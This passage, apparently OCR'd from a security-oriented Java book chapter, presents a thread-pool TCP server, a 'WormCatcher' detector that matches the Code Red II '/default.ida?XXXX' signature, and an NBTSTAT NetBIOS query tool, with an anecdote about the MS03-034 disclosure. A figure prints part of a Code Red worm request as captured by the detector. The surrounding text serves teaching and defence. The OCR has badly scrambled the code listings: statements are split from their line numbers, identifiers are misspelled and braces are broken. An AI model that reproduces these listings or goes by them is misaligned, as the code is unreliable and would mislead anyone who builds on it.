scenario (see Figure 5.2), a number of threads are created before any client connections 
are received. These threads all monitor a queue for new connections. A T C P server 
socket then accepts new client connections and places the client connection Socket 
objects into the queue being monitored by the thread pool. One of the available threads 
in the thread pool extracts the Socket object from the queue and processes the connec-
tion. Once the connection has been processed, the thread discards the Socket object and 
resumes monitoring the queue for new connections. This approach has the benefit of 
providing quick, parallel handling of new client connections without the overhead of 
frequent thread creation and destruction. In addition, threads can be added or removed 
from the thread pool on an as-needed basis in accordance with the load being placed on 
the thread pool. This approach is implemented in various open-source and commercial 
Java Servlet and JSP engines. 
Figure 5.2 Handling Socket Objects with Thread Pool 
Thread 
ServerSocket 
"71 
^ 
queue 
/ 
Socket 
if 
Socket 
^
^ 
Thnrjii 
Worker 
Thread 
Thread 
Worker 
Thread 
Thread 
Worker 
Thread 

196 
Chapter 5 • Java Sockets 
Example 5.6 shows how to implement a simple TCP server socket that processes 
TCP client connections in parallel using a thread pool similar to the process flow pre-
sented in the previous diagram. 
Example 5.6 TCP Server Socket and Parallel Processing of TCP Client Connections 
Using Thread Pool (TCP5erver2.java) 
1 /* 
2 
* TCFServer2.Java 
3 * 
4 
* TCP server socket program to bind, listen for 
5 
* request, print request and send response 
6 
* using TCP and HTTP 1.0 protocols. Client 
7 
* requests are processed by separate threads 
8 
* using a Thread Pool. 
9 * 
10 
* Usage: 
11 • 
12 
* Java TCPServer2 <lccal_port> 
13 
* 
14 
* 
15 
»/ 
16 
17 
import java.io.* 
18 
import Java,net.* ; 
19 
import Java.util.*; 
20 
21 public class TCPServer2 
22 ( 
23 
public static void main[String[] args) 
24 
( 
25 
ServerSocket serv = null; 
26 
ThreadPool 
tpool = null; 
27 
Socket 
clnt • null; 
28 
String 
tmp 
= null; 
29 
int 
port = 0 
; 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
// convert port value to integer 
45 
port = Integer .parselnt (tmp) ; 
if(args 
{ 
} 
tmp • a 
try 
t 
.length 
System 
System 
System 
rgs[G]; 
!= 1) 
err.println( 
err .printing 
.exit(l); 
•usage: 
*Example 
Java TCPServer2 " + 
* <local_jioi:t>") ; 
•: Java TCPServer2" 
+ " 80">; 

Java Sockets • Chapters 
197 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 } 
80 
81 clas s Th readPoo1 
82 { 
83 
private Vector m_queue = new Vector(); 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
95 
96 
97 
:• 
// create thread pool 
tpool = new ThreadPool (5) ; 
// init, bind, listen 
serv = new ServerSocket(port); 
System.out .printing*** listening on port * 
+ port) 
while(true) 
• : 
// accept new connection 
clnt = serv,accept 0; 
// add to thread pool 
tpool.add{cInt) ; 
> 
catch (NumberFormatException nfe) 
i 
// non-numeric port value? 
System.err.println("NumberFormatExcept ion: 
) 
catch(IOException ioe) 
( 
// connection failed? 
System.err.printIn("iOException: -
nfe.getMessage()) ; 
+ ioe.getMessage()) ; 
) 
public ThreadPool(int thread_count) 
{ 
WorkerThread wt = null; 
int 
x = 0; 
for (x=0; x < thread_count; +-t-x) 
• : 
wt = new WorkerThread(m_queue) 
wt.start(); 
} 
public void add 
(Object object 
) 

198 
Chapter 5 • Java Sockets 
98 
{ 
99 
// thread-safe access to queue 
100 
Synchronized(m_queue} 
101 
{ 
102 
m_queue,add{object); 
103 
j 
104 
} 
105 } 
106 
107 class WorkerThread 
108 
extends Thread 
109 £ 
110 
private Vector rruqueue = null; 
111 
112 
public WorkerThread 
(Vector queue) 
113 
{ 
114 
m_queue = queue; 
115 
} 
116 
117 
public void run 
() 
118 
{ 
119 
InputstreamReaderisr = null; 
1 20 
LineNumberReader lnr 
= null; 
121 
OutputStream 
OS 
= null; 
122 
InputStream 
is 
= null; 
123 
Socket 
clnt • null; 
1 24 
String 
send = null; 
125 
String 
tmp = null; 
126 
int 
x 
= 0; 
127 
1 28 
System.out.printIn("* + * WorkerThread started."J; 
129 
130 
while(true) 
131 
{ 
132 
// thread-safe access to queue 
133 
synchronized(m_queue) 
134 
{ 
135 
if(m_queue.size() > 0) 
136 
{ 
137 
clnt = iSocket)m_queue,remove(0); 
138 
} 
139 
} 
140 
141 
// new connection! 
142 
ificlnt != null) 
143 
{ 
144 
try 
145 
{ 
146 
// convert TCP client input stream 
147 
// to line number reader 
148 
is = clnt.getInputStream ( 
) ; 
149 
isr = new InputStreamReader {is ); 

Java Sockets * Chapters 
199 
150 
lnr • new LineNumberReader (isr); 
151 
152 
// read request & display 
153 
X = 0; 
1 54 
while((tmp = lnr.readLine()) 
1 55 
!= null) 
156 
( 
1 57 
System. out .print In Ex + *) * 
1 58 
+ tmp) ; 
159 
160 
if(tmp.length<> == 0) 
161 
{ 
162 
// newline delimiter 
163 
break; 
164 
} 
165 
1 
166 
167 
// format HTTP 1.0 response 
168 
// (do a little formatting).. 
169 
send 
= "HTTP/1.0 200 OK\r\n\rW 
1 7 0 
+ "<HTMLXBODY BGCOLOR=#D0D0D0>" 
171 
+ "<BRXBRXCENTERXFONT FACE=Arial-
172 
+"SIZE=1 COLOR=#0O00CC><B>fcgt;" 
173 
+"igt; TCPServer2 &lt;fclt;</B>" 
174 
+ "</FONTx/CENTERx/BOD¥x/HTML>"; 
175 
176 
// get TCP client output stream 
1 77 
os = clnt.getOutputStream(); 
178 
179 
// send HTTP 1.0 response 
180 
os.write(send.getBytes()); 
181 
) 
182 
catch[Throwable t) 
183 
{ 
184 
// catch 
throwable 
to prevent 
185 
// some 
lower-level exception 
186 
// or 
error 
from 
bubbling up 
187 
// and causing worker thread to 
188 
// 
terminate... 
189 
System.err.printing"Throwable: " 
190 
+ t.getClassl) .getNameU 
191 
+ » j • + t.getMessageO); 
192 
) 
193 
194 
// close client connection 
195 
try 
196 
{ 
197 
clnt.closeO ; 
198 
) 
199 
catch (Throwable t) 
200 
( 
201 
System.err.printlnl"IOException: * 

200 
Chapter 5 • Java Sockets 
202 
203 
204 
205 
206 
207 
208 
209 
210 
211 
212 
213 
214 
215 
216 
217 
218 
219 
220 
221 
t 
222 
} 
223 } 
—— Compilation 
C:\> j2sdkl*4.l_02\bin\javac.exe TCP5erver2.Java 
C:\> dir 
TCP$erver2.class 
ThreadFool.class 
WorkerThread.class 
Example Execution 
C:\> j2sdkl.4.l_02\bin\java.exe TCPServer2 
usage; Java TCPServer2 <local_port:> 
Example; Java TCFServer2 80 
C:\> j2sdkl-4.1_02\bin\java.exe TCFServer2 80 
*** listening on port 80 
*** WorkerThread started. 
*** WorkerThread started. 
*'* WorkerThread started. 
*** WorkerThread started. 
*** WorkerThread started. 
0) GET / HTTP/1.1 
0) Accept: 
*f 
0) Accept-Language: en-us 
+ t.getClassU .getNamef J 
+ " ; " + t-getMessage(I ) ; 
} 
finally 
{ 
clnt = null; 
} 
> 
// be nice to CPU 
try 
[ 
Thread.sleep(10 J; 
} 
catch (InterruptedEjccepti.cn ie) 
{ 
1 
// continue monitoring queue.. 

Java Sockets • Chapter 5 
201 
0) Accept-Encoding: gzip, deflate 
0) User-Agent: Mozilla/4.0 (compatible; M S I E 6.0; windows NT 5.0) 
0) HOSt: 127.0.0.1 
0) Connection: Keep-Alive 
0) 
In Example 5.6, a TCP server socket is created, bound to the port supplied on the 
command line, and used to accept new TCP client socket connections. New TCP client 
connections are placed into a queue that is being monitored by a thread pool and then 
removed from the queue and processed. The worker threads in the thread pool use TCP 
client socket instances removed from the queue to receive an HTTP 1,0 request and to 
send an HTTP 1.0 response. 
Analysis 
At lines 31 through 40, the user-supplied command line arguments are pro-
cessed. 
At line 45, the port value supplied on the command line is converted from a 
String object to an integer primitive type using the Integer parsclntf) method. 
At line 48, an instance of the ThrcadPoo! class implemented as part of the 
TCPServer2 program is created.The integer value 5 is passed to the ThreadPool 
constructor. This value is the number of worker threads that must be created 
and placed in the thread pool. 
At line 51, an instance of the ServerSocket is created, bound to the port supplied 
on the command line, and set listening for new TCP client connections. 
At lines 57 through 64, the program loops, accepting new TCP client connec-
tions and placing the associated Socket objects in the ThreadPool instance's 
queue for processing by the thread pool. 
At line 66, a try-catch handler for the NumberPormatExccptiou exception is 
declared. This exception handler is called if the port argument supplied on the 
command line is not properly formatted. 
At line 72, a try-catch handler for the lOException exception is declared. This 
exception handler is called if an exception occurs while processing new client 
connections, and may be thrown by either the TCP server socket ServerSocket 
instance or the TCP client socket instance. 
At line 81, the 'ilireadPooi class is declared. 
At line 83, a private instance variable iii_qneue is declared, which is of 
java.utH. Vector type.The java.util. Vector class is a simple data structure similar to 
an array in that it can hold multiple elements. The benefit of the Vector class is 
that the size of the Vector may increase or decrease as necessary to store an 

202 
Chapter 5 • Java Sockets 
arbitrary number of elements. Elements are accessed by supplying an integer 
index value to the get() or removeQ methods. 
• 
At line 85, the only ThrcadPool class constructor is declared. The constructor 
takes a single integer argument, thread_coimt.The thrcad_count variable is used to 
determine the number of WorkerThread instances to create. 
• 
At lines 90 to 93, a thread_coitnt number of WorkerThread instances are created. 
A reference to the Thread Poo! instance's in_aucuc Vector is passed to the con-
structor of each WorkerThread instance. The Vector is monitored by the 
WorkerThread instances for new Socket objects. 
• 
At lines 97 through 103, the ThrcadPool add() method is declared.This method 
accepts a reference to a Socket object.The Socket object reference is subse-
quently stored in the ThrcadPool instance m_queue Vector. Access to the 
m_qucuc Vector is synchronized using the Java language synchronized state-
ment. Use of the synchronized language feature is required to coordinate access 
between the program's main thread and the multiple WorkerThread instances 
that access the Vector. 
• 
At lines 107 and 108, the WorkerThread class is declared, which extends the 
java.lang.Thread class. Extension of the java.latig. Thread class is required for exe-
cuting WorkerThread instance in a separate thread. 
• 
At line 110, a private instance variable of m_queue is declared. This member 
variable is a reference only and is used by the Worker'I'hread constructor to 
store a reference to the ThrcadPool instance's m_queue Vector. 
• 
At lines 112 through 115, the WorkerThread constructor is declared. The con-
structor takes a single argument, a reference to a. Java, a til. Vector instance. This 
Vector is monitored by the instance for new Socket objects. 
• 
At line 117, the Worker I'hread run method is declared, which is required by any 
concrete (non-abstract) subclass of the java.lang.Thread class. When an instance 
of the WorkerThread is to be executed as a separate thread, the Java. lang.Thread 
super-class startQ method is called. The startQ method in turn calls the subclass 
implementation of miiQ (in this case our ntn() method implementation, and 
executes it in a separate thread. 
• 
At lines 119 through 126, the required local variables are declared. 
• 
At line 128, a startup message is printed to stdout. 
• 
At line 130, the WorkerThread processing loop begins. In this loop the m_queue 
Vector supplied by the ThrcadPool instance is continuously monitored for new 
Socket objects. If a new Socket object is found, it is removed from the Vector 
and processed in the same manner as the TCPSeri'erl program processed its 
single TCP client connection. 
• 
At lines 133 to 139, a thread-safe, synchronized access to the in_qucuc Vectors 
sizeQ method is used to determine if any new Socket objects have been added 

Java Sockets • Chapter 5 
203 
to the Vector. If the size of the vector is greater than zero, a Socket object is 
removed from the Vector using the remove() method and the index zero. Use of 
the zero index is acceptable, as the Vector class stores all elements by index 
values starting at zero. Therefore, if the size of the Vector is greater than zero, 
there will always be an element to remove at the zero index. 
• 
At line 142, the Socket chit reference is checked. If the reference is null, no 
new Socket object was retrieved from the m_queue Vector and no further pro-
cessing occurs. If the reference is not null, a Socket object was retrieved and 
the connection is processed. 
• 
At lines 148 through 150, the client connection InputStream is retrieved and 
converted to a LincNuwberRcader instance. 
• 
At lines 153 through 165, the client request is read line-by-line and printed to 
stdout. 
• 
At lines 169 through 174, the HTTP 1.0 response is formatted and stored in 
the variable send. 
• 
At line 177, the client connection OutputStream is retrieved, 
• 
At line 180, the response String referenced by the send variable is converted to 
a byte array using the String class getBytesQ method . The byte array is then 
sent to the remote client using the OutputStream class writeQ method , 
• 
At line 182, a try-catch exception handler is declared for the Throwabk class.The 
Throwabk class is the base class of all Error and Exception objects in the Java lan-
guage. The Throwable class is caught instead of the more specific lOException 
class to prevent unexpected errors or exceptions from throwing Error or 
Exception objects that go unhandled, resulting in termination of the nm() 
method and handling by the runtime default exception handler. This behavior 
would result in WorkerThread instances quitting unbeknownst to the 
TCPServer2 program. Therefore, all Throwable instances are trapped and printed 
out, but are not allowed to be handled outside of the runQ method. 
• 
At line 197, the dnt connection is closed using the Socket class closeQ method . 
• 
At line 199, a second try-catch exception handler is declared for the Throwabk 
class. The handler catches the Throwabk class for the same reason as the handler 
at line 182. 
• 
At line 205, a finally clause is declared that indicates that after closing of the 
client connection, the chit variable should be assigned a null value.This is done 
to prevent the chit variable check at line 142 from evaluating true unless a new 
Socket object has been retrieved from the m_qucue Vector. 
• 
At line 214, the java.lang.Thread sleepQ method is used to free up the system's 
processor for other tasks. If the sleepQ method is not called all WorkcrThrcad, 
instances will loop as fast as possible and use a very high amount of processor 
time. 

204 
Chapter 5 • Java Sockets 
This section looked at how to create, manage, and use the Sewer Socket class to 
implement a TCP server socket and receive TCP client connections. It also looked at 
both simple and advanced techniques for new client connection handling using serial 
and threaded designs. We are now ready to look at some of the implications of these 
techniques with respect to hacker code. 
WormCatcher 
The example programs thus far have been useful for demonstrating how to use the net-
work programming interfaces provided by thejava.net package.This section goes beyond 
a simple example and combines what has been explained in previous sections to develop 
the simple, but functional WormCatcher program, 
This WormCatcher program (see Example 5.7) uses the ServerSocket class to accept 
new TCP client connections. The TCP client connections are processed using a thread 
pool. Processing consists of examining client requests for the signature of the CodeRedll 
worm. If the worm is detected, the source IP address and port of the client connection 
will be printed along with an alert message to stdout. 
To implement the WormCatcher program, re-implement the WorkerThread class that 
was part of Example 5.6 and recompile the program. Additionally, change the name of 
the public class to WormCatcher and place all source code in the file WoniiCatdier.jaiw. 
Example 5.7 WormCatcher Worker Thread Class 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
class WorkerThread 
extends Thread 
( 
Vector 
public 
{ 
) 
public 
( 
m_cfueue • null; 
WorkerThread 
(Vector queue) 
m_queue = queue; 
void run 
{) 
lnetSocketAddress rsa 
Inpu tS t reamReade r i s r 
LineHumberReader lnr 
OutputStream 
Inputstream 
InetAddress 
boolean 
iscr 
Socket 
String 
send 
String 
tmp 
int 
int 
System.out,printIn("** 
while(true) 
{ 
-
= 
= 
-
= 
= 
* 
null; 
null; 
null ; 
OS 
m null 
is 
- null 
ria = null 
false; 
clnt = null 
null ; 
null; 
rp 
= 0; 
X 
= 0 ; 
WorkerThread 

Java Sockets * Chapter 5 
205 
30 
// thread-safe access to queue 
31 
gynchronized(m_queue) 
32 
( 
33 
if (m_queue.size{} > 0) 
34 
{ 
35 
clnt = (Socket)m_ojueue.remove(0) ; 
36 
) 
37 
} 
38 
39 
// new connection! 
40 
if (clnt != null) 
41 
{ 
42 
try 
43 
{ 
44 
// print out details 
45 
// of new connection 
46 
System.out.println{"*** new TCP" +• 
47 
* client connection.*); 
48 
49 
// convert TCP client InputStream 
50 
// to LineNumberReader 
51 
is • clnt.getlnputStream ( 
) ; 
52 
isr = new InputstreamReader(is ); 
53 
lnr = new LineNumberReader (isr); 
54 
55 
// read request k display 
56 
x = 0; 
57 
iscr = false; 
58 
while( (tmp = lnr.readLineO ) 
59 
!= null) 
60 
( 
61 
SysternTout.printIn[x++ + w) 
u 
62 
63 
64 
if(tmp.lengthO == 0) 
65 
{ 
66 
// newline delimeter 
67 
break; 
68 
} 
69 
70 
// does request look 
71 
// like CodeRed? 
72 
73 
if(tmp.indexOf 
74 
(Vdefault.ida?xxxxx") > 0) 
75 
{ 
76 
i s c r = t r u e ; 
77 
) 
78 
1 
79 
80 
// it is CodeRed (variant) 
81 
i f ( i s c r == true) 
82 
( 
83 
// get info about remote host 
84 
// & print to console.. 
85 
rsa = {InetSocketAddresa) 
86 
clnt.getRemoteSocketAddress{); 

206 
Chapter 5 • Java Sockets 
87 
88 
89 
90 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
141 
142 
143 
ria = rsa.getAddress!); 
rp = rsa.getPort 
(); 
System, out .println("+**" 
+ "CodeRed request" 
+ • detected!I!"); 
System.out.printing "Source" 
+ • Address: ' 
+ 
r i a l j 
System.out.printIn("Source" 
+ " port : " 
+ rp ); 
// not CodeRed. 
else 
// format HTTP 1.0 response 
// (do a little formatting) 
send 
= "HTTP/1.0" 
+ " 200 OK\r\n\r\n" 
+ "<HTML5.<B0DY " 
+ " BGCOLOR=it d0d0d0>" 
+ "<BRxBR>-:CENTER>" 
+ "<FONT FACE=Verdana " 
+ "SIZE=1 COLOR=#0000AA 
+ "><B>..:: 
' 
+ "WormCatcher ::.." 
+ "<:/B:></FONT:>" 
+ "</CENTER?</BODY>" 
+ "</HTML>"; 
// get TCP client 
// output stream 
os • clnt.getOutputStream(}; 
// send HTTP 1.0 response 
os.write(send.getBytes()); 
// close client connection 
clnt.closet); 
} 
catch(Throwable t) 
I 
// catch throwable to prevent some 
// lower-level exception 
// or error from bubbling up and 
// causing 
worker thread to 
// terminate... 
System.err.printIn{"Throwable: * 
+ t.getClassU.getName() 
+ " : " + t.getMessagef)); 
1 

Java Sockets • Chapter 5 
207 
144 
145 
146 
147 
148 
149 
150 
151 
152 
153 
154 
155 
156 
157 
158 
159 
160 
161 
162 
163 
164 
165 
166 
167 
168 
169 ] 
// close client connection 
try 
clnt.closed) ; 
clnt = null ; 
} 
catch [lOException ioe) 
[ 
System.err,printing"IQException; 
+ ioe.getMessage()}; 
) 
/ be nice to CPU 
try 
Thread.sleep{10); 
catch(InterruptedException le) 
// continue monitoring queue,, 
} 
- Compilation 
C:\> j2sdkl.4.l_02\bin\javac.exe WormCatcher.Java 
CJ\> dir 
ThreadPool.class 
WorkerThread.class 
WormCatcher. class 
Example Execution 
C:\> j2sdkl A . l_02\bin\java.exe WOmCatcher 
usage: Java WormCatcher <local_port> 
Example: Java WormCatcher 80 
C:\> j2sdkl,4.l_02\binVjava.exe WormCatcher 80 
*** WorkerThread started. 
*** WorkerThread started. 
*** WorkerThread started. 
*** WorkerThread started. 
*** WorkerThread started. 

208 
Chapter 5 • Java Sockets 
*** listening on port 80 
In Example 5.7, the WorkerThread class from the TCPScrver2 example is re-imple-
mented to check client requests for the Code Red II worm. If the CodeRedll worm is 
detected, the source IP address and port of the infected host is printed to stdout. 
Analysis 
At lines 13 through 24, all required local variables are declared. (Note that a 
reference of the type Iuet Socket Address variable is declared.) This variable is used 
to store and retrieve the source IP address and port of client connections. 
At lines 28 through 43, the WorkerThrcad processing loop begins and the 
m_queue Vector is monitored for new Socket objects. This functionality remains 
unchanged from the TCPScrver2 example. 
At line 4fi. a message is printed to stdout upon reception of a new TCI' client 
connection. 
At lines 51 to 53, theTCP client connection InputStream is retrieved and con-
verted to a Lific\:ui)iberRcadcr instance. 
At lines 56 through 77, the client request is read line-by-line and printed to 
stdout. At line 73, each line of the chent request is examined for the string 
value / default ,ida?XXXXX, which is the signature of the CodeRedll worm. If 
the signature is found, the iscr boolean value is set to true. 
At line 81, the iscr boolean value is checked. If the value is true, the CodeRedll 
worm has been detected and the source IP address and port of the TCP client 
connection is printed. If the iscr boolean value is false, the program continues 
execution at line 104. 
At line 85, the luct Socket Address instance that represents the endpoint of the 
TCP client connection is retrieved from the Socket instance. The 
InetSockctAddress class can then be used to obtain the IP address and port of the 
TCP client connection. 
At line 89, the InetAddress instance for the TCP client connection is retrieved. 
This object represents the IIJ address and/or hostname of theTCP client con-
nection. 
At line 91, the source port of theTCP client connection is retrieved as a prim-
itive integer value. 
At lines 93 through 100, an alert message along with the source IP address and 
port are printed to stdout. 
At lines 104 through 126, if the CodeRedll worm was not detected at line 73, 
an HTTP 1.0 response is formatted and sent to theTCP client connection. 
This functionality is the same as described for the TCPServerl program. 

Java Sockets • Chapter 5 
209 
• 
At lines 132 through 165, theTCP client socket is closed and any exceptions 
or errors are handled.This functionality remains the same as described for the 
TCPSetver2 program. 
Figure 5.3 shows the WormCatdiei program in action. The program is started, it binds 
to TCP port 80, five worker threads are created, and the program waits. First, the pro-
gram is tested with a Web browser, which produces the first few lines of output. Shortly 
thereafter, a new TCP client connection is received, which is a CodeRcdII request. The 
client GET request for /default.ida?XXXXXXXXXXXXX... matches the CodeRcdll sig-
nature and is identified by the PVormCatcher program.The source IP address and port are 
printed to stdout. 
Figure 5.3 WormCatcher Program upon Receiving CodeRedll Worm Request 
tIMlltf,!'.',! 
JO].*J 
CHIAPASK J.IUJ UormCitclici- 
1:11 
» listening on port 80 
* Un rkf: rT hi~n *id started. 
I WorherThread started. 
i Worl<erThread started. 
* WorKerTbread started. 
> UorkerThread started. 
» new TCP client connection. 
3> GET / HTTPVl.i 
L> Accept: image/gif, image/x-xbitmap, image/Jpeg, image/pjpeg, application/und.ms-excel. appli 
cation^imd.ms-pouerpoint* aPpl&Cationymsword, »^** 
2> 
flccept-Language: 
en-us 
3> Aceept-Encoding: g3ip. deflate 
4> User-Agent: MozilW4.0 (conpatible; MSIE 6.8; Windows NT 5.0} 
5> Host: 127.0.0.1 
&> Connect lent Keep-Aliue 
r> 
* new TCP c l i e n t connection. 
3> 
GET 
/ - d e t a i l I t . ida'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
KXXXXXXXXXXXXXXXXXXNXXXXXXXKXXXXXXXXXXXXXXXXXXXXXXXXXX;-ii?09Bxu685Bxucbd3xu78Bl;;u?0?0Ku6858™cbd 
3xu?8 ai/u9090Ku6OS8Kucbd3i:u7801'-:u909BKu909 »/. 119198;: H00c 3xn00B3xu8b80KuS31b^u53f f *u.6 8?8xu6808i:ii89 
HTIP^l.0 
1> C o n t e n t - t y p e : t e x t ^ x m l 
2> C o n t e n t - l e n g t h : 337? 
:n 
* CodeRed request detectedfff 
Source Address: /20B.67.157.67 
Source port 
: 4534 
zl 
This example illustrates how to combine the various elements of network program-
ming using theTCP socket functionality provided by the jam.net package. 
UDP Clients and Servers 
In contrast to TCP client and server-socket programming, UDP socket programming is 
somewhat simplified. A byte array buffer is used to store data to be sent or received.This 
buffer is managed by an instance of the Datagram Packet class. An instance of the 
DatagramSocket class is used to both send and receive Datagram Packet instances, or more 
accurately, the byte arrays managed by them. 
In UDP socket programming using the jam. net package, there is very little distinction 
between client and server socket implementation. This is the result of UDP being a state-
less, datagram protocol. There is no concept of being connected to a host beyond having 
record of the local and remote endpoints that data is to be sent to or received from. 
In the case of a UDP server socket, an instance of the DatagramSockct class is bound 
to a port using an API similar to that of the ServcrSocket class. However, unlike the 

210 
Chapter 5 • Java Sockets 
SeiverSocket class, no new Socket objects are returned for client connections, because 
there is no concept of a client connection when using the UDP protocol. Instead, for 
each new UDP datagram received, an existing instance of the Datagram Packet is popu-
lated using the Data^ramSocket receive() method. 
NOTE I 
One night while working on the NBTSTAT.java example program, I sent a col-
league an Instant Message. A portion of the contents of the message appeared 
in the output from the NBTSTAT program. This sparked the interest of the col-
league, who followed up on the issue. It turned out that Microsoft Windows NT 
through XP did not properly zero-out the padding bytes used in NetBIOS Name 
Service replies, thus disclosing arbitrary portions of memory. This issue was 
brought to the attention of Microsoft and resulted in release of the MS03-034 
NetBIOS Name Service Information Disclosure security bulletin. 
Example 5.8 illustrates how to use the DatagramSocket and DatagraniPacket classes to 
implement a basic utility for querying NetBIOS Name Service information.This is 
roughly the same request that can be made using the Microsoft Windows command-line 
program tihtstat.exe (c:\>nbtstat -A <tar)>ctjwst>). The response packet returned should 
include information such as the remote host's domain or workgroup name and com-
puter name. 
Example 5.8 The NBTSTAT Program (NBTSTAT.java) 
1 /* 
2 
* NBTSTAT.j ava 
3 
4 
* netbios name service query program 
5 
* over UDP pore 137 using Java 
6 
* j ava r net package DatagramSocket and 
7 
* DatagramPacket classes. 
8 
9 
10 v 
11 
12 import java.io** ; 
13 import java.net.*; 
14 
15 public class NBTSTAT 
16 ( 
17 
public static void main(String[] args) 
18 
( 
19 
DatagramSocket ds 
- null; 
20 
DatagramPacket dpqry = null; 
21 
DatagramPacket dprsp - null; 
22 
InetAddress 
ia 
- null; 
23 
String 
tmp 
= null; 
24 
byte [ ] 
brsp = new byte [OxFFFFl ; 
25 
byte [ ] 
bqry = new byte [ ] 
26 
( 

Java Sockets • Chapters 
211 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
// NetBIOS over TCP/IP (NBT) 
// name service query... 
(byte) 0x81, (bytel 0xd4, 
0x00, 0x00, 0x00, 0x01, 0x00, 0x00 
0x00, 0x00, 0x20, 0x43, 0x4b, 0x41 
0x41, 0x41, 0x41, 0x41, 0x41, 0x41 
0x41, 0x41, 0x41, 0x41, 0x41, 0x41 
0x41, 0x41, 0x41, 0x41, 0x41, 0x41 
0x41, 0x41, 0x41, 0x00, 0x00, 0x21 
0x00, 0x00, 
0x41, 0x41, 
0x41, 0x41, 
0x41, 0x41, 
0x41, 0x41, 
0x00, 0x01 
if(args. 
try 
• : 
length != 1) 
System.out .printlnpusage: Java NBTSTAT" 
+• * <target_ip>*) ; 
System, out .print In (** Example: Java NBTSTAT'' 
+ • 192.163.1.1"); 
System.exit fl); 
tmp = args[0]; 
// convert String to metAddress 
ia = InetAddress.getByName(tmp) ; 
ds = new DatagramSocket(); 
// configure datagram socket w/ destination 
// InetAddress 
ds.connect(ia, 137); 
// create DatagramPacket 
dpqry = new DatagramPacket(bqry, bqry.length); 
// send NBT query to target 
ds.send 
(dpqry); 
// create DatagramPacket 
dprsp = new DatagramPacket(brsp, brsp.length); 
// receive response 
ds,receive(dprsp); 
// close datagram socket 
ds,close(); 
// display response in tcpdump -K format 
System.out .printing*** NET query reply (" + ia 
+ ")(" + dprsp, getLengthO + "):"); 
System, out. print In P*) ; 
printByteArray(dprsp.getData(), dprsp.getLength()); 
l.ry 
{ 

212 
Chapter 5 • Java Sockets 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
Thread.sleep(10); 
} 
catch(interruptedException ie) 
{ 
) 
catch [IOException ioe) 
{ 
System.err.printIn(*IOException: 
+ ioe.getMessageti ); 
: 
private static void printByteArray[bytef] array, int lenj 
{ 
String hex = null; 
byte[] tmp = new byte[161; 
Lnt 
i :it 
i:il. 
for t ; x < lenj ++x) 
{ 
tmp[y++] = 3rray|x], 
if(y % 16 == 0) 
for(z=0; 2 < y; ++z) 
{ 
hex = Integer. toHexString (tmp[z) k OxFF} j 
if[hex.length!) == 1) 
( 
hex = "0" + hex; 
} 
System.out.print(hex + " * ) ; 
> 
for(z=0; z < y; ++z) 
{ 
if(tmp[z] > 0x30 Sfc 
tmp[z] < 0x7B) 
{ 
else 
( 
System.out.print((char)tmp(z]) 
System.out.print(*.') 
System, out. print In P") ; 
y=0; 
iffy > 0) 

Java Sockets • Chapter 5 
213 
141 
142 
143 
144 
145 
146 
147 
148 
149 
150 
151 
152 
153 
154 
155 
156 
157 
158 
159 
160 
161 
162 
163 
164 
165 
166 
167 
168 
169 
170 
171 
172 
173 
174 
175 
176 
177 
178 
179 
} 
180 ) 
•: 
} 
System. 
return; 
for(z=0; 
{ 
1 
z = y; 
while(z 
< 
> 
for(z=0; 
{ 
} 
z < y; ++z) 
hex = Integer.toHexString(tmp(z] & OxFF) 
if(hex.length!) == 1) 
t 
hex = *0* + hex; 
) 
System,out-print (hex -*• " , l); 
< 16) 
System.out.print(" 
") ; 
z < y; +-t-z) 
if(tmp(z] > 0x30 && 
tmpEz] i QxlB) 
i 
System.out.print((char)tmp[zj); 
) 
else 
t 
System,out .print (V*J ? 
) 
System, out .printing"} ; 
out ^ r i n t l n p " ) ; 
""*"" Compilation 
C:\> j2sdkl.4.l_02\bin\javac.exe NBTSTAT.Java 
C:\> dir 
NBTSTAT.class 

214 
Chapter 5 • Java Sockets 
i y N J s [ i s Example Execution 
C:\> j2s(3kl.4. l_02\bin\java.exe NBTSTAT 
usage: Java NBTSTAT <target_ip> 
Example: java NBTSTAT 192.1S6.1.1 
C:\> j2s<3>.l, 4. l_02\bin\java.exe NBTSTAT 10.0.1.31 
*** NBT query reply (/10.0.1.81)(265): 
81 d4 84 00 00 00 00 01 00 00 00 00 20 43 4b 41 
CKfl 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA 
41 41 41 41 41 41 41 41 41 41 41 41 41 00 00 21 AAAAAAAAAAAAA. . . 
00 01 00 00 00 00 00 bf OS 57 49 4e 32 4b 54 45 
WIN2KTE 
53 54 31 53 50 33 20 20 00 44 00 57 49 4e 32 4b ST1SP3...D.WIN2K 
54 45 53 54 31 53 50 33 20 20 20 44 00 57 4f 52 TEST1SP3...D.WOR 
4b 47 52 4f 55 50 20 20 20 20 20 20 00 c4 00 57 KGRCUP 
W 
